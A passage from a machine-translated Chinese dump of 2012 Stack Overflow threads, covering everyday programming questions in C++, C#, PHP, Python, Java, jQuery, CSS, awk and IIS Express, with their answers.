为什么不让用户使用命令行参数选择文件名？您可以使用`-o` 命令行选项。让用户使用`-`文件名重定向到标准输出的奖励点。然后，他可以使用另一种工具进行管道传输。例如：`merger -o - part*.bin | tar zxvf -`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T08:51:43.310

您可以为每个拆分的文件添加一个带有完整文件名的标题，但也可以包含 - 例如 - 原始大小、校验和等。

* * *

**编辑**：如何将文本写入二进制流

```
fstream f(/* initialize*/);

std::string s = "asdf";

// Store the size of text
auto size = s.size();
f.write(&size, sizeof(size));

// Store the string itself
f.write(s.c_str(), s.size()); 
```

# ios - 应用程序不想在 iPhone 上运行

> ID：10102691
> 
> 赞同：0
> 
> 时间：2012-04-11T08:47:38.623
> 
> 标签：ios, xcode4.3

我有一个想在我的 iPhone 上运行的应用程序。我已经对其进行了代码签名并多次检查了所有内容。它构建，然后 Xcode 4.3 只是告诉我“在 iPhone 上完成运行 MYAPP”——但什么也没发生。该应用程序甚至没有安装在我的 iPhone 上！我制作的其他应用程序仍然可以正常工作，即使是在 Xcode 4.3 中构建的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T08:50:46.067

也许您在 armv6 设备上构建时缺少 armv6 架构？或者您确实设置了所需的设备功能，这些功能在您正在构建的设备上不可用。

试试这个：建立档案，导出 IPA 文件，打开管理器。将 IPA 拖放到您的设备上。在这里，您将收到更详细的错误消息。

# vb.net - 拖动时表单未置于前面

> ID：10102692
> 
> 赞同：2
> 
> 时间：2012-04-11T08:47:46.330
> 
> 标签：vb.net, forms, drag

我创建了一个列表表单，它附加到 VB.NET 中的主表单。这一切都很好，除了当主窗体被激活时，我也需要将列表放在前面。我已经输入了一个简单的 IF 函数来执行此操作，但是当我添加这些代码行时，主窗体以及列表窗体现在不会被带到前面，直到您松开鼠标按钮。显然，这意味着如果您拖动表单，它会一直停留在后面，直到您松开鼠标按钮。

我添加的代码如下：

```
 If CRL.Visible = True Then
   CRL.BringToFront()
 End If 
```

CRL 是列表形式。

如果我再次注释掉这段代码，主窗体在拖动时会被带到前面，但显然列表窗体不会。主窗体和列表窗体都是 MDI 子窗体。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T09:28:32.450

你用最顶层的属性来欺骗它：

```
If CRL.Visible = True Then
   CRL.BringToFront()
   CRL.TopMost = True 
   Application.DoEvents
   CRL.TopMost = False
End If 
```

# linq - 将此代码转换为 LINQ

> ID：10102693
> 
> 赞同：0
> 
> 时间：2012-04-11T08:47:49.037
> 
> 标签：linq

我有一些我知道如果在 LINQ 中完成可能会更好的代码，但我不知道 LINQ 代码会是什么样子。

我有一个 GoodsItems 集合，在每个 Item 中都有一个 Comments 集合，我想过滤掉其中的一些评论并变成单个字符串行。

这是代码：

```
 //-- get all comments that is of type "GoodsDescription"
                ICollection<FreeText> comments = new List<FreeText>();

                foreach (DSV.Services.Shared.CDM.Shared.V2.GoodsItem goodsItem in shipmentInstructionMessage.ShipmentInstruction.ShipmentDetails.GoodsItems)
                {
                    ICollection<DSV.Services.Shared.CDM.Shared.V2.FreeText> freeTexts = goodsItem.Comments.Where(c => c.Type.ToLower() == FREETEXT_TYPE_GOODSDESCRIPTION.ToLower()).ToList();
                    foreach (DSV.Services.Shared.CDM.Shared.V2.FreeText freeText in freeTexts)
                        comments.Add(FreeText.CreateFreeTextFromCDMFreeText(freeText));
                }

                //-- Turn this collection of comments into a single string line 
                StringBuilder sb = new StringBuilder();
                foreach (FreeText comment in comments)
                    sb.Append(comment.ToString());

                contents = sb.ToString(); 
```

第一个 Foreach 循环遍历所有 goodsitems，对于每个商品项目，我得到所有评论，其中评论的类型等于定义的值。

然后，对于我得到的每条评论，我都会创建一个新对象并添加到 CommentsCollection 中。

最后一件事是我循环通过这个 commentsColletion 并将它的所有数据创建到单个字符串行中。

使用 LINQ 必须有更好、更智能的方法来做到这一点。

谢谢...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:58:31.060

看起来你可以这样做：

```
var comments = from goodsItem in shipmentInstructionMessage.ShipmentInstruction.ShipmentDetails.GoodsItems
               from freeText in goodsItem.Comments.Where(c => string.Equals(c.Type, FREETEXT_TYPE_GOODSDESCRIPTION, StringComparison.InvariantCultureIgnoreCase))
               select FreeText.CreateFreeTextFromCDMFreeText(freeText).ToString();
string contents = string.Join("", comments); 
```

它可能更具可读性，只是因为您丢失了大多数类型（尽管您也可以使用隐式类型的局部变量来实现这一点）。

（我还更改了对注释类型进行字符串比较的方式——我假设您正在尝试实现大小写不变的比较。您可能希望使用它`StringComparison.CurrentCultureIgnoreCase`，具体取决于注释的内容。）

# unix - Unix/Linux：将固定宽度文件转换为两列上的 csv 和子集

> ID：10102694
> 
> 赞同：1
> 
> 时间：2012-04-11T08:47:51.237
> 
> 标签：unix, subset

我有[这个](http://dl.dropbox.com/u/1791181/Parse.txt)宽度为 34, 2, 3, 2, 1, 1, 3, 1, 2, 1, 2, 2 和 75 的固定宽度文件，我想 (a) 转换为分隔 (csv) 格式然后 (b) 根据 V2="03" 和 V5="1" 的子集。我已经想出了第一步：

```
awk -v FIELDWIDTHS='34 2 3 2 1 1 3 1 2 1 2 2 75' -v OFS=',' '{ $1=$1 ""; print }' </filepath/Parse.txt > /filepath/Parse.csv 
```

但我在第 2 步被难住了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:52:57.163

Try with:

```
awk -v FIELDWIDTHS='...' -v OFS=',' '($2=="03") && ($5=="1"){ $1=$1 ""; print }' 
```

# python - python，没有得到完整的响应

> ID：10102696
> 
> 赞同：3
> 
> 时间：2012-04-11T08:47:57.783
> 
> 标签：python, url, urllib2

当我想使用 urllib2 获取页面时，我没有得到完整的页面。

这是python中的代码：

```
import urllib2
import urllib
import socket
from bs4 import BeautifulSoup
# define the frequency for http requests
socket.setdefaulttimeout(5)

    # getting the page
def get_page(url):
    """ loads a webpage into a string """
    src = ''

    req = urllib2.Request(url)

    try:
        response = urllib2.urlopen(req)
        src = response.read()
        response.close()
    except IOError:
        print 'can\'t open',url 
        return src

    return src

def write_to_file(soup):
    ''' i know that I should use try and catch'''
    # writing to file, you can check if you got the full page
    file = open('output','w')
    file.write(str(soup))
    file.close()

if __name__ == "__main__":
            # this is the page that I'm trying to get
    url = 'http://www.imdb.com/title/tt0118799/'
    src = get_page(url)

    soup = BeautifulSoup(src)

    write_to_file(soup)    # open the file and see what you get
    print "end" 
```

我整个星期都在努力寻找问题！为什么我没有完整的页面？

感谢帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T10:56:01.310

您可能必须多次调用 read，只要它不返回指示 EOF 的空字符串：

```
def get_page(url):
    """ loads a webpage into a string """
    src = ''

    req = urllib2.Request(url)

    try:
        response = urllib2.urlopen(req)
        chunk = True
        while chunk:
            chunk = response.read(1024)
            src += chunk
        response.close()
    except IOError:
        print 'can\'t open',url 
        return src

    return src 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2018-04-30T21:41:48.607

我有同样的问题，我虽然是 urllib 但它是 bs4。

而不是使用

```
BeautifulSoup(src) 
```

或者

```
soup = bs4.BeautifulSoup(html, 'html.parser') 
```

尝试使用

```
soup = bs4.BeautifulSoup(html, 'html5lib') 
```

# tridion - 如何向 Tridion 添加额外的多媒体类型？

> ID：10102697
> 
> 赞同：-1
> 
> 时间：2012-04-11T08:48:00.423
> 
> 标签：tridion

我正在使用 SDL Tridion 2011 SP1。

我需要对它允许的多媒体模式和类型进行一些小的说明。

默认情况下，Tridion 将允许一些多媒体类型，如 word 文档、JPEG 等。

如果我想添加更多类型，可以在 Tridion 中使用吗？

假设我的应用程序想要使用 Tridion 不支持的多媒体类型。如何使 Tridion 支持该多媒体类型？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-11T08:52:50.737

这在文档[http://sdllivecontent.sdl.com/LiveContent/content/en-US/SDL_Tridion_2011_SPONE/task_F8456F78DAC540F2A72BC8EC70E2CA4C](http://sdllivecontent.sdl.com/LiveContent/content/en-US/SDL_Tridion_2011_SPONE/task_F8456F78DAC540F2A72BC8EC70E2CA4C)中有描述。

# php - 在 php 中使用 return 关键字非常有趣

> ID：10102702
> 
> 赞同：1
> 
> 时间：2012-04-11T08:48:13.110
> 
> 标签：php

众所周知，**return**关键字将返回一些值并退出当前函数。意思是，这个仅在某些功能内部使用。

**但是，**我看到一些 php-dev 在函数之外使用 return 关键字，甚至在 index.php 文件中（在 Web 服务器的根目录中）。那什么意识？？？？顺便说一句，也许在函数中需要一些文件是合乎逻辑的，但这种风格不是我的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:50:24.040

[除了文档](http://php.net/manual/en/function.return.php)所做的事情外，没有什么可说的了。

关于 的常见用法`return`：

> 如果从函数内部调用，该`return`语句会立即结束当前函数的执行，并将其参数作为函数调用的值返回。return 还将结束`eval()`语句或脚本文件的执行。

关于不太常见的用法：

> 如果从全局范围调用，则结束当前脚本文件的执行。如果当前脚本文件是`include`d 或`require`d，则将控制权传递回调用文件。此外，如果包含当前脚本文件，则返回的值将作为包含调用的值返回。如果从主脚本文件中调用 return，则脚本执行结束。如果当前脚本文件由 php.ini 中的 auto_prepend_file 或 auto_append_file 配置选项命名，则该脚本文件的执行结束。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T08:50:26.597

它记录在手册中的某处

```
// myFile.php
return array( 'foo' => 'bar');

// somewhere else
$config = include 'myFile.php';
echo $config['foo']; 
```

如果您`return`在主范围内使用 php 将保留文件包含并使用该值作为包含 ( `include[_once]()`, `require[_once]()`) 的“返回值”。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T08:55:16.723

> 但是，我看到一些 php-dev 在函数之外使用 return 关键字，甚至在 index.php 文件中（在 Web 服务器的根目录中）。那什么意识？？？

你知道共同的目的。但是您要问的是用于防止 php*包含*文件中的代码注入。看看这篇解释它的帖子：

[**防止 PHP 包含文件中的代码注入**](http://hakre.wordpress.com/2010/03/03/prevent-code-injection-in-php-include-files/)

> 在讨论编码标准时，不久前我反对在 php 文件末尾添加 ?>。但是 miqrogroove 向我指出了一个有趣的方面，为什么它实际上是有意义的，并且在每个文件的末尾有一个额外的 return 语句：**那个（仅仅是 return 语句）可以防止攻击者将有效负载代码附加到现有的 PHP 文件，例如已知的包含文件。**对策很简单，只需在文件末尾添加一个return语句即可。它将结束包含“子程序”：

**例子：**

```
 /* all the include file's php code */
  return;
?> 
```

# java - 从Java中的位置读取文本文件

> ID：10102703
> 
> 赞同：4
> 
> 时间：2012-04-11T08:48:13.063
> 
> 标签：java, text, io

我需要使用指定的字符集从 OFFSET 的文本文件中读取 char[]（大小为 COUNT）。COUNT 和 OFFSET 是字符，而不是字节。他是我的代码：

```
raf = new RandomAccessFile(filePath, "r");      
if ((mBuffer == null) || (mBuffer.length < count)) {
    mBuffer = new byte[(int)(count/mDecoder.averageCharsPerByte())];
    mByteWrap = ByteBuffer.wrap(mBuffer);
    mCharBuffer = new char[count];
    mCharWrap = CharBuffer.wrap(mCharBuffer);
}
try {
    offset = (int)(offset/mDecoder.averageCharsPerByte());
    count = (int)(count/mDecoder.averageCharsPerByte());
    raf.seek(offset);
    raf.read(mBuffer,0,count);
    mByteWrap.position(0);
    mCharWrap.position(0);
    mDecoder.decode(mByteWrap, mCharWrap, true);
} catch (IOException e) {
    return null;
}
return mCharBuffer; 
```

**有没有更简单的方法？（无需手动匹配 char->byte）**

我正在寻找 java.util.Scanner，但它是 Iterator 风格的，我需要随机访问风格。

PS数据不应该被复制多次

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T08:56:30.890

使用 BufferedReader 的[`skip()`](http://docs.oracle.com/javase/1.4.2/docs/api/java/io/BufferedReader.html#skip%28long%29)方法。在你的情况下：

```
BufferedReader reader = new BufferedReader(new FileReader(filePath));
reader.skip(n); // chars to skip
// .. and here you can start reading 
```

如果你想指定一个特定的编码，你可以使用

```
InputStream is = new FileInputStream(filePath);
BufferedReader reader = new BufferedReader(new InputStreamReader(is,"UTF-8"));
reader.skip(n); // chars to skip
// .. and here you can start reading 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:40:31.350

您可以使用 BufferedInputStream 的 read(byte[] b, int off, int len)

这里 off 是偏移量（从你想开始阅读的地方开始）

[http://docs.oracle.com/javase/7/docs/api/java/io/BufferedInputStream.html#read%28byte[],%20int,%20int%29](http://docs.oracle.com/javase/7/docs/api/java/io/BufferedInputStream.html#read%28byte%5B%5D,%20int,%20int%29)

# android - 如何在冰淇淋三明治中设置 TabWidget 的样式？

> ID：10102704
> 
> 赞同：5
> 
> 时间：2012-04-11T08:48:21.033
> 
> 标签：android, android-layout, android-widget

我在 Ice Cream Sandwich 应用程序中使用 TabHost/TabWidget 的折旧库。我没有时间熟悉 ActionBarSherlock，所以我不得不以我知道的唯一方式进入应用程序。

我想知道如何设置 TabWidget 及其 Tab 对象的样式，从更改选定的选项卡颜色到背景颜色和图像？使用标准样式和主题似乎不起作用。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-11T09:36:29.073

假设不推荐使用的库像往常一样工作，这就是我用来为标签着色的过程。我只是在代码中设置了背景，因为它不能在 xml 中直接访问：

```
 TabWidget tabs = (TabWidget)getTabWidget();            
        for (int i = 0; i<tabs.getChildCount(); i++) {
            RelativeLayout tab = (RelativeLayout) tabs.getChildAt(i);
            tab.setBackgroundDrawable(this.getResources().getDrawable(R.drawable.tabindicator)); 
```

tabindicator drawable 如下：

```
<?xml version="1.0" encoding="utf-8" ?> 
<selector xmlns:android="http://schemas.android.com/apk/res/android">
<!--  Non focused states --> 
<item android:state_focused="false" android:state_selected="false" android:state_pressed="false" android:drawable="@drawable/tab_unselected" /> 
<item android:state_focused="false" android:state_selected="true" android:state_pressed="false" android:drawable="@drawable/tab_selected" /> 
<!--  Focused states  --> 
<item android:state_focused="true" android:state_selected="false" android:state_pressed="false" android:drawable="@drawable/tab_focus" /> 
<item android:state_focused="true" android:state_selected="true" android:state_pressed="false" android:drawable="@drawable/tab_focus" /> 
 <!--  Pressed  --> 
<item android:state_selected="true" android:state_pressed="true" android:drawable="@drawable/tab_press" /> 
<item android:state_pressed="true" android:drawable="@drawable/tab_press" /> 
</selector> 
```

可绘制对象只是带有颜色的 9-patch 图像，尽管您可以使用标准颜色获得类似的效果。

# windows-phone-7 - StackTraces 中的 Windows Phone 7 行号？

> ID：10102708
> 
> 赞同：1
> 
> 时间：2012-04-11T08:48:44.730
> 
> 标签：windows-phone-7, stack-trace, line-numbers

我正在开发一个 WP7 应用程序。该应用程序有一个相当大的 XML 解析方法和一个围绕它的 try/catch 块。当发生异常时，我只是从异常的堆栈跟踪中获取导致方法的名称，但没有行号。

因此，在 400+ LoC 方法中进行调试非常烦人。

我的猜测是 pdb 文件根本没有部署到手机上。

一种解决方法是将大型方法拆分为较小的方法，并使用越来越小的 try/catch 块。

但是有什么方法可以在 Windows Phone 7 例外中启用行号？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T09:40:30.430

首先，400+ LoC 方法是一种不好的做法，我肯定会建议拆分它。

小技巧：如果您正在使用调试器，只需将其配置为在任何异常时中断（在 Visual Studio 中，按 Control + Alt + e，然后选中“公共语言运行时异常”前面的“抛出”复选框。然后，当抛出异常时，调试器会自动停在异常位置。

现在回答你的问题，如果在调试模式下编译时没有行号，那么可能没有实用的方法来获取它们。您可以尝试在 xap 文件中注入 pdb，但我认为这不值得。

# c# - 一年中的一周 C# 日期时间

> ID：10102714
> 
> 赞同：11
> 
> 时间：2012-04-11T08:49:06.713
> 
> 标签：c#, windows, datetime, gregorian-calendar

我有以下代码来获取 DateTime 对象时间中给出的年份的周数

```
 public static int WeeksInYear(DateTime date)
    {
        GregorianCalendar cal = new GregorianCalendar(GregorianCalendarTypes.Localized);
        return cal.GetWeekOfYear(date, CalendarWeekRule.FirstFourDayWeek, DayOfWeek.Monday);
    } 
```

我给函数的日期是 2012 年 1 月 1 日，它应该返回第 1 周，但它返回第 52 周。我似乎不知道为什么。有人知道为什么吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-11T08:51:26.380

该算法正在执行您指示它执行的操作。您将 CalanderWeekRule 设置为 FirstFourDayWeek。2012 年 1 月 1 日不是第一个四天周的一部分，因此您已指示日历从 1 月 2 日开始计数。

[从周数计算日期](https://stackoverflow.com/questions/662379/calculate-date-from-week-number)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-01-03T03:48:36.137

```
public static int WeeksInYear(DateTime date)
{
    GregorianCalendar cal = new GregorianCalendar(GregorianCalendarTypes.Localized);
    return cal.GetWeekOfYear(date, CalendarWeekRule.FirstDay, DayOfWeek.Monday); 
```

我认为如果将**CalendarWeekRule.FirstFourDayWeek**更改为**CalendarWeekRule.FirstDay**那么这将正常工作。

我改变了这个然后它工作正常。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T10:01:05.990

您可以使用支持 ISO 8601 周编号的 .NET的[时间周期库类](http://www.codeproject.com/Articles/168662/Time-Period-Library-for-NET)**周：**

```
TimeCalendar calendar = new TimeCalendar(
    new TimeCalendarConfig { YearWeekType = YearWeekType.Iso8601 } );
Week week = new Week( new DateTime( 2012, 01, 01 ), calendar );
Console.WriteLine( "week #: ", week.WeekOfYear ); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-11T08:57:23.090

周数计算正确。您应该阅读实际如何计算/计算周数（维基百科？！）。

注意：周数计算的内置计算是错误的。Microsoft 在[知识库文章 200299](http://support.microsoft.com/kb/200299)中描述了该问题。ISO-8601 有问题。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-11T08:52:01.407

我假设因为 2012 年 1 月 1 日是星期天并`GetWeekOfYear`说它返回包含日期的星期，所以它返回 2011 年的最后一周而不是 2012 年的第一周。

请查看[CalendarRule](http://msdn.microsoft.com/en-us/library/system.globalization.calendarweekrule.aspx)以进行澄清。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-11T08:52:59.797

1/1/2012 it was sunday. I believe that's why you get 52, because it was last day of the last year week. For the 2nd of january you should get the right result.

# php - PHP数组仅使用“获取元标记”功能的第一行文本区域

> ID：10102716
> 
> 赞同：0
> 
> 时间：2012-04-11T08:49:09.893
> 
> 标签：php

我对 PHP 还很陌生，所以请多多包涵:)

如果将 URL 放入文本区域，然后为每个区域提取元数据，我正在尝试做什么。

我已经制作了脚本，但是当我在文本区域中放置多个 URL 时，它只返回最后输入的 URL 的数据，我想也许你们可以帮助我:)

```
<form method="POST">
<textarea name="TAData">
</textarea>
<input type="submit" value="submit"/>
</form>

<div id="checkboxes">
<input type="checkbox" name="vehicle" value="PR" /> Show me the PR<br />
<input type="checkbox" name="vehicle" value="KW Tag" /> Show me the KW tag<br />
<input type="checkbox" name="vehicle" value="Title Tag" /> Show me the Title tag<br />
</div>
<div id="checkboxes">
<input type="checkbox" name="vehicle" value="1stH1" /> Show me the 1st H1<br />
<input type="checkbox" name="vehicle" value="2ndH1" /> Show me the 2nd H1 tag<br />
<input type="checkbox" name="vehicle" value="SeedKW" /> Show me Seed KW's<br />
</div>

<div id="nofloat"></div>

<?php

//make the array 
$TAarray = explode("\n", strip_tags($_POST['TAData'])); 

foreach ($TAarray as $key => &$line) { $line = trim($line); }
            // get the meta data for each url
            $tags = get_meta_tags($line);

unset($tags["content-type"]);
unset($tags["page-type"]);
unset($tags["page-topic"]);
unset($tags["audience"]);
unset($tags["content-language"]);       

            echo '<tr>';
            foreach ($tags as $meta)        
            {
                    echo '<td>' . $meta . '</td>';
            }
            echo '</tr>';

?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:54:35.600

在行上使用 trim 之后的结束 } 意味着 foreach 结束，并且只有最后一行在循环之后可用于其他操作。只需将该支架移至末尾即可。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:28:41.567

如果您`foreach`与引用一起使用，最好在循环后删除该引用：

```
foreach ($TAarray as $key => &$line)
{
    $line = trim($line); 
}
unset($line); # remove the reference for safety reasons 
```

但是由于您不会`$TAarray`在该代码之后进行迭代，因此该代码无论如何都是多余的。不要编写多余的代码。我建议如下：

```
//make the array 
$TAarray = explode("\n", strip_tags($_POST['TAData'])); 
$TAarray = array_map('trim', $TAarray); 
```

我建议你把它放到它自己的函数中：

```
/**
 * @param string $html
 * @return string[] lines
 */
function getTrimmedTextLinesArrayFromHTMLBlock($html)
{
    $text = strip_tags($html);
    $lines = explode("\n", $text);
    $trimmed = array_map('trim', $lines);
    return $trimmed;
} 
```

然后，您可以在任何您认为合适的地方使用它。您还可以使用不同的输入独立测试此功能：

```
$lines = getTrimmedTextLinesArrayFromHTMLBlock($_POST['TAData']));
$blacklist= array("content-type", "page-type", "page-topic", 
                "audience", "content-language");
foreach ($lines as $line)
{
    if (! $tags = get_meta_tags($line)) continue;
    echo '<tr>';
    foreach ($tags as $key => $meta)
    {
        if (in_array($key, $blacklist)) continue;
        echo '<td>' . $meta . '</td>';
    }
    echo '</tr>';
} 
```

我希望这是有帮助的。

# jquery - 在弹出窗口中验证表单而不在 Django/jQuery 中重新加载页面

> ID：10102719
> 
> 赞同：2
> 
> 时间：2012-04-11T08:49:37.797
> 
> 标签：jquery, python, ajax, django, forms

我试图在其登录页面上创建与 reddit 相同的功能 - 如果您访问 reddit.com 并单击页面右上角的“登录或注册”链接，它将加载一个弹出框以登录或注册. 当您在框中单击提交时，它将验证服务器端并返回错误，而无需关闭弹出框/重新加载整个页面。

我假设这是在 ajax 中以某种方式完成的，但我不确定如何去做。我的页面上有一个类似的弹出框，但是我无法像在 Django 中通常默认的那样显示验证错误，我很好奇如何开始解决这个问题。我应该使用 jQuery 的 ajax 调用并尝试以某种方式将表单发送到 Django 并检索验证错误吗？如果是这样，我该怎么做？如果没有，我该怎么做？

谢谢一群人！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T10:40:54.560

您可以使用[jquery-from](http://malsup.com/jquery/form/)。您的视图可能会向您发送呈现错误的表单，因此您只需使用 $(form_div).html(received_data) 更改表单内容，或者它可能会向您发送您手动处理的 JSON 错误列表。

# qt - 为什么 wxWidgets 更新绘图比 Qt 慢？

> ID：10102720
> 
> 赞同：0
> 
> 时间：2012-04-11T08:49:46.663
> 
> 标签：qt, wxwidgets

我正在使用 wxWidgets 绘制一个大流程图，即 625 x 26329 像素。该程序从 Qt 传输到 wxWidgets。它的布局很容易，主框架内部有一个自定义的滚动窗口。滚动窗口每次在更新的客户区域内绘制图表的一部分。

现在 Qt 和 wxWidgets 有很大的不同。当鼠标滚动垂直滚动时，Qt 刷新绘制图表非常流畅，而 wxWidgets 则缓慢闪烁。

谁能告诉我如何有效地制作这幅画？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2017-01-06T12:53:26.087

你确定它很慢？我想知道，我遇到了不同的经历。

你提到闪烁。闪烁主要是由于过多的刷新调用造成的。为了防止这种情况，您必须使用双缓冲，这是关键。

双缓冲意味着将屏幕外的所有内容绘制到图像/位图中，并且在绘制完所有内容之后，图像/位图被完全绘制（这样做非常快，所以没有闪烁:)！）。

Qt 用于默认的双缓冲。这就是为什么它看起来每次都很顺利。然而，这种方法的缺点是它会消耗性能。wxWidgets 并不限制你。相反，它说，获得双缓冲是你的任务。

你也应该看看你是否没有剪裁你正在绘制的区域。在 Windows 下使用 wxWidgets 进行剪辑给了我更好的性能。

PS：是的，老问题，但我认为仍然需要知道事实如何。

# jquery - 以变 化的间隔隐藏和显示元素

> ID：10102721
> 
> 赞同：0
> 
> 时间：2012-04-11T08:49:47.450
> 
> 标签：jquery

我正在编程的网站上有一个标题；假设标题说`"LIKE THIS"`。

我希望这个词在 和`THIS`之间不断变化——没有任何褪色效果，但间隔不同。`THIS``THAT`

假设我希望这个词在开头出现并在那里停留 2 秒。然后我希望它变成 TAHT（原文如此），但只有 200 毫秒，直到变成 THAT 并在那里停留 3 秒，直到变回 THIS，然后重新开始整个过程​​。

我熟悉几个`looping/cycling`插件`jquery (Cycle, InnerFade, etc)`，但它们似乎都想添加效果——而且它们似乎都不能提供不同间隔的可能性。

希望听到某人的消息。非常感谢您提前。

//一个。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:56:53.760

让你开始的东西：

HTML

```
<span id="text">THIS</span>​ 
```

JavaScript

```
function changeToTaht() {
    // Change text, and call changeToThat, in 200ms
    $('#text').text('TAHT');
    setTimeout(changeToThat, 200);        
}   

function changeToThat() {
    // Change text, and call changeToThis, in 3000ms
    $('#text').text('THAT');
    setTimeout(changeToThis, 3000);    
}

function changeToThis() {
    // Change text, and call changeToTaht, in 3000ms
    // This will make the loop run again, and again, and again...
    $('#text').text('THIS');
    setTimeout(changeToTaht, 3000);
}

$(document).ready(function() {
    // Start the loop by calling changeToTaht, in 1000ms 
    setTimeout(changeToTaht, 1000);
}); 
```

​jsFiddle：http: [//jsfiddle.net/Webye/](http://jsfiddle.net/Webye/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:52:51.483

You can use the javascript functions of [setInterval](https://developer.mozilla.org/en/DOM/window.setInterval) and [setTimeout](https://developer.mozilla.org/en/DOM/window.setTimeout). These will allow you to set off jquery functions at predefined time intervals.

# c# - Response.Redirect 不起作用

> ID：10102726
> 
> 赞同：0
> 
> 时间：2012-04-11T08:50:19.423
> 
> 标签：c#, asp.net, response

我想知道为什么我的 Response.Redirect 不起作用。所以基本上，我阅读了我文件夹中的文件，或者确切地说是 index.html。当我找到它时，我会重定向到它。

```
 foreach (System.IO.FileInfo thefile in fiArr)
        {
            if (thefile.Name == "index.html")
            {
                //Response.Redirect(path + "/index.html", false);
                Response.Redirect("C://inetpub//wwwroot//Folder//" + ((LinkButton)sender).ID,     false);
            }
        } 
```

我只是想知道为什么这不会重定向到任何地方。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-11T09:59:49.877

Response.Redirect 仅支持重定向到以“http://”开头的 URL、位于同一服务器上的虚拟文件夹或同一文件夹中的文件。

您可以将包含文件的文件夹添加为服务器中的虚拟文件夹，然后重定向到文件的虚拟位置。

另一种方法是使用 javascript 将客户端重定向到文件。

# iphone - 使用 CSS 定位移动设备（iPad、iPhone），但排除非移动设备

> ID：10102730
> 
> 赞同：3
> 
> 时间：2012-04-11T08:50:36.473
> 
> 标签：iphone, ipad, css, media-queries

我正在尝试针对移动设备（特别是 iPad 和 iPhone），但使用 CSS3 媒体查询将相同的样式添加到具有相同分辨率的其他设备，例如笔记本电脑。如何在不将其添加到其他非移动设备的情况下添加移动设备特定样式？

到目前为止，我正在使用它，它将 css 添加到所有宽度为 1024px 及以下的设备中，即使使用了方向选择器：

```
@media only screen and (min-device-width: 320px) and (orientation:portrait),
                       (max-device-width: 1024px) and (orientation:landscape){
           // Do something
} 
```

**编辑：** 对于任何感兴趣的人，我只是通过复制媒体查询但稍微改变副本来实现这一点。这是迄今为止最有效的方法，但主要是它有效：

```
@media only screen and (min-device-width: 320px) and (orientation:portrait),
                   (max-device-width: 1024px) and (orientation:landscape){
       // some styling
}

@media only screen and (min-device-width: 320px) and (orientation:portrait),
                   (max-device-width: 768px) and (orientation:portrait){
       // some styling
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:53:45.180

也许看看[这个](http://www.w3.org/TR/CSS2/media.html)，在**“7.3 识别的媒体类型”**部分，会对你有所帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T09:14:41.723

是的：[桌面浏览器`orientation`也支持媒体查询](http://www.browsersupport.net/CSS/%40media_%28orientation%29)。

我不认为媒体查询提供了一种检测设备是 iPad 还是 iPhone 的方法。它们允许您检查设备的功能（如其宽度和方向），而不是识别设备。

是什么让你的风格不适合非 iPad 设备？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-08-27T00:28:36.703

我发现您只需要编辑中的第二个媒体查询：

```
@media only screen and (min-device-width: 320px) and (orientation: portrait),
   (max-device-width: 768px) and (orientation: portrait) {
   // some styling
} 
```

它就像一个魅力！

# c# - 整个窗口的 C# MouseEnter-Event

> ID：10102733
> 
> 赞同：3
> 
> 时间：2012-04-11T08:50:45.180
> 
> 标签：c#, mouseenter

是否也可以为窗口的边框创建一个 MouseEnter-Event？我的意思也是最小化和最大化按钮。因为如果我为我的 Form1 设置事件，它仅在我在表单内时有效，而不是在边框和按钮上。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T09:19:54.683

您可以在表单中覆盖 WndProc 并且可以检测 mousemove

```
protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);
            // mouse in window or in Border and max, close & min buttons     
            if (m.Msg == 0xa0 || m.Msg == 0x200)
            {
                //Do some thing
            }
        } 
```

# asp.net - IIS Express 上的 GZip 响应

> ID：10102743
> 
> 赞同：26
> 
> 时间：2012-04-11T08:51:42.327
> 
> 标签：asp.net, gzip, iis-express

我想压缩来自我的 IIS Express 驱动的 Web 应用程序的响应。我们使用 IIS Express 作为本地开发网络服务器，并在登台和构建机器上使用 IIS。我找到了许多关于在 IIS 上启用 gzip 响应的指南，但没有找到针对 IIS Express 的指南。甚至可能吗？

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2012-04-12T04:56:55.617

您可以在 IIS Express 中启用压缩，就像 IIS 一样。

1.  启动命令提示符并转到 IIS Express 安装文件夹 ( `%PROGRAMFILES%\IIS Express`)

2.  运行以下命令

> appcmd 设置配置 -section:urlCompression /doDynamicCompression:true

要为 JSON 添加压缩，请从 IIS Express 安装目录运行以下两个命令：

